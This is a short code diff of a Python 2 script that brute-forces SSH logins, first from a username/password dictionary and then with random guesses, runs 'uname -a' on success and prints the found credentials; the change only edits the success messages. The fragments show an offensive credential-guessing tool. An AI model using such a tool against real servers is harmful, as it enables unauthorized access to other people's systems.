@@ -22,7 +22,7 @@ with open('user.txt','r') as u:
 
                                 for line in stdout.readlines():
                                         print line.strip()
-                                        print "Usuario encontrado!..User:%s, Pass:%s................\n" % (usrnm,psswrd)
+                                        print "Usuario encontrado via dicionario!..User:%s, Pass:%s................\n" % (usrnm,psswrd)
                                         ssh.close()
 import random
 while True:
@@ -46,6 +46,6 @@ while True:
     stdin,stdout,stderr = ssh.exec_command("uname -a")
     for line in stdout.readlines():
         print line.strip()
-        print "Usuario encontrado!..User:%s, Pass:%s................\n" % (u,p)
+        print "Usuario encontrado via brute force random !..User:%s, Pass:%s................\n" % (u,p)
     ssh.close()
     quit()
